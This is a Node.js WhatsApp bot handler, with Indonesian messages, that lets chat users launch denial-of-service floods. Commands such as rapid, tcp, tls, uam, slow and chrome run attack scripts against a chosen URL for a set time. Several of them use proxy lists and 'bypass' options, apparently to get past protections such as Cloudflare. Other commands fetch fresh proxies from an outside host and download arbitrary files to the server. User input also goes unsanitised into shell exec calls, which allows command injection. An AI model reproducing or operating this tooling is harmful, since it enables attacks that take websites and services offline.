const fs = require('fs');
const axios = require('axios');
const { exec } = require('child_process');
const moment = require('moment');

module.exports = async (x, msg, store) => {
  const type = Object.keys(msg.message)[0];
  const body = type === "conversation" ? msg.message.conversation : type === "extendedTextMessage" ? msg.message.extendedTextMessage.text : type === "imageMessage" ? msg.message.imageMessage.caption : type === "videoMessage" ? msg.message.videoMessage.caption : '';
  const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#';
  const isCmd = body.startsWith(prefix);
  const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
  const from = msg.key.remoteJid;

  if (isCmd) {
    console.log(require("chalk").black(require("chalk").bgGreen(`Command ${prefix + command} `)), require("chalk").black(require("chalk").bgWhite(`Dari ${msg.pushName}`)));
  }

  const reply = (teks, quotedMessage = null) => {
    if (quotedMessage) {
      x.sendMessage(from, { text: teks, quoted: quotedMessage });
    } else {
      x.sendMessage(from, { text: teks }, { quoted: msg });
    }
  };

  switch (command) {
    case "tes": {
      reply("On Kak!!!");
      break;
    }
    case "rapid": {
      const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
      const [url, time] = parameters.split(' ');

      if (!url || !time || isNaN(time)) {
        reply("Format command rapid salah. Contoh penggunaan: rapid https://example.com 120");
        return;
      }

      exec(`node rapid.js bypass ${time} 39 proxy.txt 9 ${url}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing rapid.js: ${error.message}`);
          reply(`Error executing rapid.js: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`Rapid.js stderr: ${stderr}`);
          reply(`Rapid.js stderr: ${stderr}`);
          return;
        }
        console.log(`Rapid.js stdout: ${stdout}`);

        const outputLines = stdout.split('\n');
        const [executedAt, urlExecuted, executionTime] = outputLines;

        const formattedDate = moment(executedAt).format('DD MMMM YYYY');

        const replyMessage = `Rapid.js berhasil dijalankan dengan detail:\n`
          + `URL: ${urlExecuted}\n`
          + `Time: ${executionTime}\n`
          + `Tanggal: ${formattedDate}`;

        reply(replyMessage);
      });

      break;
    }
    case "tcp": {
      const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
      const [url, time] = parameters.split(' ');

      if (!url || !time || isNaN(time)) {
        reply("Format command tcp salah. Contoh penggunaan: tcp http://1.1.1.1 120");
        return;
      }

      exec(`node tcp.js ${url} ${time} 80`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing tcp.js: ${error.message}`);
          reply(`Error executing tcp.js: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`tcp.js stderr: ${stderr}`);
          reply(`tcp.js stderr: ${stderr}`);
          return;
        }
        console.log(`tcp.js stdout: ${stdout}`);

        const outputLines = stdout.split('\n');
        const [executedAt, urlExecuted, executionTime] = outputLines;

        const formattedDate = moment(executedAt).format('DD MMMM YYYY');

        const replyMessage = `tcp.js berhasil dijalankan dengan detail:\n`
          + `URL: ${urlExecuted}\n`
          + `Time: ${executionTime}\n`
          + `Tanggal: ${formattedDate}`;

        reply(replyMessage);
      });

        break;
      }
      case "stars": {
        const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
        const [url, time] = parameters.split(' ');

        if (!url || !time || isNaN(time)) {
          reply("Format command stars salah. Contoh penggunaan: stars https://example.com 120");
          return;
        }

        exec(`node stars.js ${url} ${time}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Error executing stars.js: ${error.message}`);
            reply(`Error executing stars.js: ${error.message}`);
            return;
          }
          if (stderr) {
            console.error(`stars.js stderr: ${stderr}`);
            reply(`stars.js stderr: ${stderr}`);
            return;
          }
          console.log(`stars.js stdout: ${stdout}`);

          const outputLines = stdout.split('\n');
          const [executedAt, urlExecuted, executionTime] = outputLines;

          const formattedDate = moment(executedAt).format('DD MMMM YYYY');

          const replyMessage = `stars.js berhasil dijalankan dengan detail:\n`
            + `URL: ${urlExecuted}\n`
            + `Time: ${executionTime}\n`
            + `Tanggal: ${formattedDate}`;

          reply(replyMessage);
        });

          break;
        }
        case "raw": {
          const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
          const [url, time] = parameters.split(' ');

          if (!url || !time || isNaN(time)) {
            reply("Format command raw salah. Contoh penggunaan: raw https://example.com 120");
            return;
          }

          exec(`node raw.js ${url} ${time} 39`, (error, stdout, stderr) => {
            if (error) {
              console.error(`Error executing raw.js: ${error.message}`);
              reply(`Error executing raw.js: ${error.message}`);
              return;
            }
            if (stderr) {
              console.error(`raw.js stderr: ${stderr}`);
              reply(`raw.js stderr: ${stderr}`);
              return;
            }
            console.log(`raw.js stdout: ${stdout}`);

            const outputLines = stdout.split('\n');
            const [executedAt, urlExecuted, executionTime] = outputLines;

            const formattedDate = moment(executedAt).format('DD MMMM YYYY');

            const replyMessage = `raw.js berhasil dijalankan dengan detail:\n`
              + `URL: ${urlExecuted}\n`
              + `Time: ${executionTime}\n`
              + `Tanggal: ${formattedDate}`;

            reply(replyMessage);
          });

            break;
          }
          case "tls": {
            const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
            const [url, time] = parameters.split(' ');

            if (!url || !time || isNaN(time)) {
              reply("Format command tls salah. Contoh penggunaan: tls https://example.com 120");
              return;
            }

            exec(`node tls.js ${url} ${time} 39 9 proxy.txt`, (error, stdout, stderr) => {
              if (error) {
                console.error(`Error executing tls.js: ${error.message}`);
                reply(`Error executing tls.js: ${error.message}`);
                return;
              }
              if (stderr) {
                console.error(`tls.js stderr: ${stderr}`);
                reply(`tls.js stderr: ${stderr}`);
                return;
              }
              console.log(`tls.js stdout: ${stdout}`);

              const outputLines = stdout.split('\n');
              const [executedAt, urlExecuted, executionTime] = outputLines;

              const formattedDate = moment(executedAt).format('DD MMMM YYYY');

              const replyMessage = `tls.js berhasil dijalankan dengan detail:\n`
                + `URL: ${urlExecuted}\n`
                + `Time: ${executionTime}\n`
                + `Tanggal: ${formattedDate}`;

              reply(replyMessage);
            });

              break;
            }
              case "uam": {
                const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
                const [url, time] = parameters.split(' ');

                if (!url || !time || isNaN(time)) {
                  reply("Format command uam salah. Contoh penggunaan: uam https://example.com 120");
                  return;
                }

                exec(`node uam.js ${url} ${time} 250 proxy.txt 1`, (error, stdout, stderr) => {
                  if (error) {
                    console.error(`Error executing uam.js: ${error.message}`);
                    reply(`Error executing uam.js: ${error.message}`);
                    return;
                  }
                  if (stderr) {
                    console.error(`uam.js stderr: ${stderr}`);
                    reply(`uam.js stderr: ${stderr}`);
                    return;
                  }
                  console.log(`uam.js stdout: ${stdout}`);

                  const outputLines = stdout.split('\n');
                  const [executedAt, urlExecuted, executionTime] = outputLines;

                  const formattedDate = moment(executedAt).format('DD MMMM YYYY');

                  const replyMessage = `uam.js berhasil dijalankan dengan detail:\n`
                    + `URL: ${urlExecuted}\n`
                    + `Time: ${executionTime}\n`
                    + `Tanggal: ${formattedDate}`;

                  reply(replyMessage);
                });                               
              break;
            }
            case "slow": {
              const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
              const [url, time] = parameters.split(' ');

              if (!url || !time || isNaN(time)) {
                reply("Format command slow salah. Contoh penggunaan: slow https://example.com 120");
                return;
              }

              exec(`node slow.js ${url} ${time} 64 10 proxy.txt bypass`, (error, stdout, stderr) => {
                if (error) {
                  console.error(`Error executing slow.js: ${error.message}`);
                  reply(`Error executing slow.js: ${error.message}`);
                  return;
                }
                if (stderr) {
                  console.error(`slow.js stderr: ${stderr}`);
                  reply(`slow.js stderr: ${stderr}`);
                  return;
                }
                console.log(`slow.js stdout: ${stdout}`);

                const outputLines = stdout.split('\n');
                const [executedAt, urlExecuted, executionTime] = outputLines;

                const formattedDate = moment(executedAt).format('DD MMMM YYYY');

                const replyMessage = `slow.js berhasil dijalankan dengan detail:\n`
                  + `URL: ${urlExecuted}\n`
                  + `Time: ${executionTime}\n`
                  + `Tanggal: ${formattedDate}`;

                reply(replyMessage);
              });   
break;
            }
            case "chrome": {
              const parameters = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');
              const [url, time] = parameters.split(' ');

              if (!url || !time || isNaN(time)) {
                reply("Format command chrome salah. Contoh penggunaan: chrome https://example.com 120");
                return;
              }

              exec(`node chrome.js ${url} ${time} 39 9 proxy.txt`, (error, stdout, stderr) => {
                if (error) {
                  console.error(`Error executing chrome.js: ${error.message}`);
                  reply(`Error executing chrome.js: ${error.message}`);
                  return;
                }
                if (stderr) {
                  console.error(`chrome.js stderr: ${stderr}`);
                  reply(`chrome.js stderr: ${stderr}`);
                  return;
                }
                console.log(`chrome.js stdout: ${stdout}`);

                const outputLines = stdout.split('\n');
                const [executedAt, urlExecuted, executionTime] = outputLines;

                const formattedDate = moment(executedAt).format('DD MMMM YYYY');

                const replyMessage = `chrome.js berhasil dijalankan dengan detail:\n`
                  + `URL: ${urlExecuted}\n`
                  + `Time: ${executionTime}\n`
                  + `Tanggal: ${formattedDate}`;

                reply(replyMessage);
              })                      
      break;
    }
    case "menu": {
      const aboutText = "Bot ini adalah bot yang dikembangkan untuk membantu Anda dalam berbagai hal. Gunakan dengan bijak.";
      const featuresList = "Fitur yang tersedia:\n"
        + "- Tes: Menampilkan pesan 'On Kak!!!'\n"
        + "- Rapid [URL] [Time]: Menjalankan script rapid.js dengan URL dan waktu tertentu\n"
        + "- TCP [URL] [Time]: Menjalankan script tcp.js dengan URL dan waktu tertentu\n"
        + "- Menu: Menampilkan informasi tentang bot ini dan daftar fiturnya\n"
        + "- GetProxy: Menghapus file proxy.txt dan mendownload file dari https://pawretirend.github.io/proxy/\n"
        + "- Get [URL]: Mendownload file dari URL yang diberikan";

      const menuMessage = `${aboutText}\n\n${featuresList}`;
      reply(menuMessage);

      break;
    }
    case "getproxy": {
      fs.unlink('proxy.txt', (err) => {
        if (err && err.code === 'ENOENT') {
          console.log('File proxy.txt tidak ditemukan.');
        } else if (err) {
          console.error(`Error saat menghapus file proxy.txt: ${err.message}`);
          reply(`Error saat menghapus file proxy.txt: ${err.message}`);
          return;
        } else {
          console.log('File proxy.txt berhasil dihapus.');
        }

        axios.get('https://pawretirend.github.io/proxy/proxy.txt', { responseType: 'stream' })
          .then(response => {
            const fileStream = fs.createWriteStream('proxy.txt');
            response.data.pipe(fileStream);

            fileStream.on('finish', () => {
              fileStream.close();
              console.log('File proxy.txt berhasil didownload.');
              reply('File proxy.txt berhasil didownload.');
            });

            fileStream.on('error', (err) => {
              console.error(`Error saat menulis file proxy.txt: ${err.message}`);
              reply(`Error saat menulis file proxy.txt: ${err.message}`);
            });
          })
          .catch(error => {
            console.error(`Error saat mendownload file: ${error.message}`);
            reply(`Error saat mendownload file: ${error.message}`);
          });
      });

      break;
    }
    case "get": {
      const urlToDownload = body.slice(prefix.length).trim().split(' ').slice(1).join(' ');

      if (!urlToDownload) {
        reply("Format command get salah. Contoh penggunaan: get https://example.com/file.zip");
        return;
      }

      const fileName = urlToDownload.split('/').pop();
      const fileStream = fs.createWriteStream(fileName);

      axios.get(urlToDownload, { responseType: 'stream' })
        .then(response => {
          response.data.pipe(fileStream);

          fileStream.on('finish', () => {
            fileStream.close();
            console.log(`File ${fileName} berhasil didownload.`);
            reply(`File ${fileName} berhasil didownload.`);
          });

          fileStream.on('error', (err) => {
            console.error(`Error saat menulis file ${fileName}: ${err.message}`);
            reply(`Error saat menulis file ${fileName}: ${err.message}`);
          });
        })
        .catch(error => {
          console.error(`Error saat mendownload file dari ${urlToDownload}: ${error.message}`);
          reply(`Error saat mendownload file dari ${urlToDownload}: ${error.message}`);
        });

      break;
    }
    default: {
      // Handle unknown commands here
      break;
    }
  }
};
